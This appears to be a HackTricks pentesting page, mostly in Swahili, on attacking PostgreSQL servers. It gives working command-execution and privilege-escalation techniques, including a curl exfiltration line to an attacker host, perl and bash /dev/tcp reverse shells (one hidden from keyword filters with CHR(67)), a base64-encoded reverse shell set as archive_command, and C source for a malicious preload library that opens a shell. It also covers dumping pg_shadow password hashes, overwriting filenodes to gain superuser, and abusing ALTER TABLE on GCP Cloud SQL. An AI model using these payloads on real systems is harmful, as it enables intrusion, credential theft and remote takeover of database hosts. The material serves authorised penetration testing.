# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Taarifa za Msingi**

**PostgreSQL** imeelezewa kama **object-relational database system** ambayo ni **chanzo wazi**. Mfumo huu hauitumi tu lugha ya SQL bali pia unaiboresha kwa vipengele vya ziada. Uwezo wake unamuwezesha kushughulikia aina mbalimbali za data na operesheni, ukifanya kuwa chaguo linalofaa kwa waendelezaji na mashirika.

**Port ya chaguo-msingi:** 5432, na ikiwa port hii tayari inatumika inaonekana kwamba postgresql itatumia port inayofuata (5433 pengine) ambayo haijatumika.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Unganisha & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Ikiwa unapoendesha **`\list`** na ukapata database inayoitwa **`rdsadmin`**, unajua uko ndani ya **AWS postgresql database**.

Kwa habari zaidi kuhusu **jinsi ya kutumia vibaya PostgreSQL database**, angalia:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Uorodheshaji wa Kiotomatiki
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Kulingana na [**this research**](https://www.exploit-db.com/papers/13084), wakati jaribio la kuunganisha linaposhindwa, `dblink` hutoa exception `sqlclient_unable_to_establish_sqlconnection` ikiwa na maelezo ya kosa. Mifano ya maelezo haya imeorodheshwa hapa chini.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host iko chini

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port imefungwa
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port iko wazi
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
au
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port iko wazi au imechujwa
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Katika PL/pgSQL functions, kwa sasa haiwezekani kupata maelezo ya exception. Hata hivyo, ikiwa una ufikiaji wa moja kwa moja kwa PostgreSQL server, unaweza kupata taarifa zinazohitajika. Ikiwa kuchota usernames and passwords kutoka kwenye system tables haiwezekani, unaweza kuzingatia kutumia wordlist attack method iliyoelezewa katika sehemu iliyopita, kwani inaweza kutoa matokeo chanya.

## Orodha ya Ruhusa

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Roli ina ruhusa za superuser                                                                                                                        |
| rolinherit     | Roli inarithi kiotomatiki ruhusa za roli ambazo ni mwanachama wake                                                                                 |
| rolcreaterole  | Roli inaweza kuunda roli zaidi                                                                                                                       |
| rolcreatedb    | Roli inaweza kuunda databases                                                                                                                        |
| rolcanlogin    | Roli inaweza kuingia. Yaani, roli hii inaweza kutolewa kama kitambulisho cha awali cha idhini ya kikao                                               |
| rolreplication | Roli ni roli ya replication. Roli ya replication inaweza kuanzisha muunganisho wa replication na kuunda na kufuta replication slots.                 |
| rolconnlimit   | Kwa roli ambazo zinaweza kuingia, hii inaweka idadi ya juu ya muunganisho sambamba ambazo roli hii inaweza kufanya. -1 ina maana hakuna kikomo.     |
| rolpassword    | Sio password (soma kama `********` kila wakati)                                                                                                     |
| rolvaliduntil  | Muda wa kumalizika wa password (inatumika tu kwa uthibitisho wa password); null ikiwa hakuna kumalizika                                           |
| rolbypassrls   | Roli inapita sera zote za usalama za row-level, angalia [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) kwa maelezo zaidi. |
| rolconfig      | Chaguo-msingi maalum kwa roli kwa vigezo vya usanidi wakati wa utekelezaji                                                                          |
| oid            | Kitambulisho (ID) cha roli                                                                                                                           |

#### Makundi ya Kuvutia

- Ikiwa wewe ni mwanachama wa **`pg_execute_server_program`** unaweza **kutekeleza** programu
- Ikiwa wewe ni mwanachama wa **`pg_read_server_files`** unaweza **kusoma** faili
- Ikiwa wewe ni mwanachama wa **`pg_write_server_files`** unaweza **kuandika** faili

> [!TIP]
> Kumbuka kwamba katika Postgres **user**, **group** na **role** ni **sawa**. Inategemea tu **jinsi unavyovitumia** na ikiwa unaruhusu **kuingia**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Jedwali
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Kazi
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Vitendo vya mfumo wa faili

### Soma saraka na faili

Kutoka kwenye [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), wanachama wa kikundi kilichofafanuliwa **`DEFAULT_ROLE_READ_SERVER_FILES`** (kinachoitwa **`pg_read_server_files`**) na **super users** wanaweza kutumia njia ya **`COPY`** kwenye njia yoyote (angalia `convert_and_check_filename` katika `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Kumbuka kwamba ikiwa wewe si super user lakini una ruhusa za **CREATEROLE** unaweza **kujifanya kuwa mwanachama wa kundi hilo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Kuna **other postgres functions** ambazo zinaweza kutumika **kusoma faili au kuorodhesha saraka**. Ni **superusers** na **users with explicit permissions** pekee wanaweza kuzitumia:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Unaweza kupata **kazi zaidi** katika [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Kuandika Faili Rahisi

Ni **watumiaji wakuu** tu na wanachama wa **`pg_write_server_files`** wanaoweza kutumia copy kuandika faili.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Kumbuka kwamba ikiwa wewe si super user lakini una ruhusa za **`CREATEROLE`** unaweza **kujifanya mwanachama wa kikundi hicho:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Kumbuka kwamba COPY haiwezi kushughulikia newline chars, kwa hivyo hata ikiwa unatumia payload ya base64 **unahitaji kutuma mstari mmoja**.\
Kizuizi muhimu sana cha mbinu hii ni kwamba **`copy` haiwezi kutumika kuandika binary files kwa sababu inabadilisha baadhi ya binary values.**

### **Kupakia mafaili ya binary**

Hata hivyo, kuna **mbinu nyingine za kupakia mafaili makubwa ya binary:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Kusasisha data za jedwali la PostgreSQL kupitia kuandika faili ya ndani

Ikiwa una ruhusa zinazohitajika za kusoma na kuandika mafaili ya server ya PostgreSQL, unaweza kusasisha jedwali lolote kwenye server kwa **kuandika juu ya filenode inayohusiana** katika [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Hatua zinazohitajika:

1.  Pata directory ya data ya PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Note:** Ikiwa huwezi kupata njia ya sasa ya data directory kutoka settings, unaweza kuuliza major PostgreSQL version kupitia query ya `SELECT version()` na kujaribu brute-force njia. Njia za kawaida za data directory kwenye Unix installations za PostgreSQL ni `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Jina la cluster la kawaida ni `main`.

2.  Pata njia ya relative ya filenode inayohusiana na jedwali lengwa

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Hii query inapaswa kurudisha kitu kama `base/3/1337`. Njia kamili kwenye disk itakuwa `$DATA_DIRECTORY/base/3/1337`, yaani `/var/lib/postgresql/13/main/base/3/1337`.

3.  Pakua filenode kupitia functions za `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Pata datatype inayohusiana na jedwali lengwa

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Tumia [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) ili [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); weka bendera zote za kimantiki `rol*` kuwa 1 kwa ruhusa kamili.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Pakia tena filenode iliyohaririwa kupitia functions za `lo_*`, na andika juu ya faili asili kwenye disk

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Hiari)_ Futa cache ya jedwali iliyomo kwenye memory kwa kuendesha query ya SQL yenye gharama kubwa

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Sasa unapaswa kuona thamani za jedwali zimesasishwa ndani ya PostgreSQL.

Unaweza pia kuwa superadmin kwa kuhariri jedwali la `pg_authid`. **See** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE kwa programu**

Tangu[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), ni **super users** pekee na wanachama wa kikundi **`pg_execute_server_program`** wanaoweza kutumia copy kwa RCE (mfano na exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Mfano wa exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Kumbuka kwamba ikiwa huna super user lakini unayo ruhusa ya **`CREATEROLE`** unaweza **kujifanya mwanachama wa kundi hilo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Au tumia moduli ya `multi/postgres/postgres_copy_from_program_cmd_exec` kutoka **metasploit**.\
Taarifa zaidi kuhusu udhaifu huu [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ingawa iliripotiwa kama CVE-2019-9193, Postgres ilitangaza kuwa hii ilikuwa [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass vichujio vya maneno muhimu/WAF kufikia COPY PROGRAM

Katika muktadha wa SQLi yenye stacked queries, WAF inaweza kuondoa au kuzuia neno-kifungu halisi `COPY`. Unaweza kujenga kauli hiyo kwa wakati wa utekelezaji na kuitekeleza ndani ya PL/pgSQL DO block. Kwa mfano, jenga C ya mwanzoni kwa kutumia `CHR(67)` ili kupita vichujio rahisi na kisha EXECUTE amri iliyokusanywa:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Mara tu umejifunza kutoka chapisho lililopita **how to upload binary files** unaweza kujaribu kupata **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> Miundo ya RCE zifuatazo ni muhimu hasa katika muktadha uliopunguzwa wa SQLi, kwani hatua zote zinaweza kufanywa kupitia nested SELECT statements

Faili ya usanidi ya PostgreSQL ina uwezo wa kuandikwa na postgres user, ambaye ndiye anayeendesha database, kwa hiyo kama superuser unaweza kuandika faili kwenye filesystem, na hivyo unaweza overwrite faili hii.

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

Maelezo zaidi [kuhusu mbinu hii hapa](https://pulsesecurity.co.nz/articles/postgres-sqli).

Faili ya usanidi ina vigezo vinavyovutia vinavyoweza kusababisha RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **Ikiwa** kipengee hiki kiko **on** basi **command** itakayotekelezwa endapo funguo litakuwa limefichwa kwa nywila **itatekelezwa** wakati `pg_reload_conf()` itakapotekelezwa.

Kisha, mdukuzi atalazimika:

1. **Dump private key** kutoka server
2. **Encrypt** downloaded private key:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** the current postgresql **configuration**
5. **Overwrite** the **configuration** with the mentioned attributes configuration:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

Wakati nikifanya majaribio niligundua kwamba hii itaweza kufanya kazi tu ikiwa faili ya private key ina privileges 640, inamilikiwa na root na na group ssl-cert au postgres (hivyo postgres user anaweza kuisoma), na iko katika _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Kipengele kingine katika faili ya usanidi kinachoweza kutumiwa ni `archive_command`.

Ili hili lifanye kazi, setting ya `archive_mode` lazima iwe `'on'` au `'always'`. Ikiwa ni kweli, tunaweza overwrite command katika `archive_command` na kulazimisha itekelezwe kupitia operesheni za WAL (write-ahead logging).

Hatua kwa ujumla ni:

1. Angalia kama archive mode iko enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` na payload. Kwa mfano, reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Wakati uandishi wa mistari mingi unahitajika (mfano, kuweka GUCs nyingi), tumia PostgreSQL Large Objects kusoma na ku-overwrite config kabisa kupitia SQL. Njia hii ni bora katika muktadha wa SQLi ambapo `COPY` haiwezi kushughulikia newlines au binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Hii inatoa utekelezaji thabiti wa amri za OS kupitia `archive_command` kama mtumiaji `postgres`, mradi `archive_mode` iwe imewezeshwa. Katika matumizi, kuweka `archive_timeout` ndogo kunaweza kusababisha kuitishwa haraka bila kuhitaji WAL switch wazi.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- maktaba ambazo zitatapakiwa na server ya PostgreSQL wakati wa muunganisho wa mteja.
- `dynamic_library_path` -- orodha ya saraka ambako server ya PostgreSQL itatafuta maktaba.

Tunaweza kuweka thamani ya `dynamic_library_path` hadi saraka inayoweza kuandikwa na mtumiaji `postgres` anayekimbisha database, mf. saraka ya `/tmp/`, kisha kupakia kipengee chenye madhara cha `.so` huko. Kisha tutalazimisha server ya PostgreSQL kupakia maktaba tuliyopakia kwa kuiweka kwenye `session_preload_libraries`.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Pakia `postgresql.conf` yenye madhara (iliyotengenezwa hatua 2-3) na uibadilishe ile ya asili
7. Pakia `payload.so` kutoka hatua 5 hadi saraka `/tmp`
8. Reload usanidi wa server kwa kuanzisha upya server au kwa kuendesha query `SELECT pg_reload_conf()`
9. Wakati wa muunganisho ujao wa DB, utapokea muunganisho wa reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Kulingana na [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Hivyo, ikiwa una ruhusa ya **`CREATEROLE`** unaweza kujipa ufikiaji wa **roles** nyingine (zisizo superuser) ambazo zinaweza kukupa chaguo la kusoma na kuandika faili na kutekeleza amri:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Badilisha Nenosiri

Watumiaji walio na jukumu hili pia wanaweza **kubadilisha** **manenosiri** ya **non-superusers** wengine:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc kwa SUPERUSER

Ni kawaida sana kupata kuwa **local users can login in PostgreSQL without providing any password**. Kwa hiyo, mara tu unapopata **permissions to execute code** unaweza kutumia vibaya ruhusa hizi kukupa nafasi ya **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Hii kwa kawaida inawezekana kwa sababu ya mistari ifuatayo katika faili **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Katika [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) imeelezea jinsi ilivyowezekana kufanya **privesc** katika Postgres GCP kwa kutumia vibaya ruhusa za ALTER TABLE zilizotolewa kwa mtumiaji.

Unapojaribu **kumfanya mtumiaji mwingine mmiliki wa jedwali** unapaswa kupata **hitilafu** inayokuzuia, lakini inaonekana GCP ilimpa **chaguo hilo mtumiaji postgres ambaye si superuser** katika GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Kuunganisha wazo hili na ukweli kwamba wakati amri za **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) zinaendeshwa kwenye **jedwali lenye index function**, **function** **inaitwa** kama sehemu ya amri kwa kutumia **jedwali** **ruhusa za mmiliki**. Inawezekana kuunda index yenye function na kumpa ruhusa za mmiliki kwa **super user** juu ya jedwali hilo, kisha kuendesha ANALYZE kwenye jedwali hilo kwa function hatari itakayoweza kutekeleza amri kwa sababu inatumia ruhusa za mmiliki.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Anza kwa kuunda jedwali jipya.
2. Ingiza maudhui yasiyo muhimu kwenye jedwali ili kutoa data kwa ajili ya index function.
3. Unda malicious index function inayobeba payload ya code execution, ikiruhusu amri zisizoidhinishwa kutekelezwa.
4. Tumia ALTER kubadilisha owner wa jedwali hadi "cloudsqladmin", ambayo ni role ya superuser ya GCP inayotumiwa pekee na Cloud SQL kusimamia na kudumisha database.
5. Fanya operesheni ya ANALYZE kwenye jedwali. Hatua hii inalazimisha engine ya PostgreSQL kuhamia muktadha wa mtumiaji wa mmiliki wa jedwali, "cloudsqladmin". Kwa hivyo, malicious index function itaitewa ikitumia ruhusa za "cloudsqladmin", na hivyo kuruhusu utekelezaji wa shell command ambao awali haukuruhusiwa.

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Kisha, jedwali `shell_commands_results` litakuwa na matokeo ya msimbo uliotekelezwa:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Kuingia kwa mtumiaji wa ndani

Baadhi ya instansi za postgresql zilizopangwa vibaya zinaweza kuruhusu kuingia kwa mtumiaji yeyote wa ndani; inawezekana kuingia kutoka 127.0.0.1 kwa kutumia **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Kumbuka kwamba ili query iliyotangulia ifanye kazi **function `dblink` inapaswa kuwepo**. Ikiwa haipo unaweza kujaribu kuunda kwa
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Ikiwa una nywila ya mtumiaji mwenye ruhusa zaidi, lakini mtumiaji huyo hauruhusiwi kuingia kutoka IP ya nje, unaweza kutumia function ifuatayo kutekeleza queries kama mtumiaji huyo:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Inawezekana kuangalia ikiwa function hii ipo kwa:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Kazi iliyobainishwa maalum yenye** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters waliweza privesc ndani ya instance ya postgres iliyotolewa na IBM, kwa sababu walikuta function hii yenye the SECURITY DEFINER flag:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

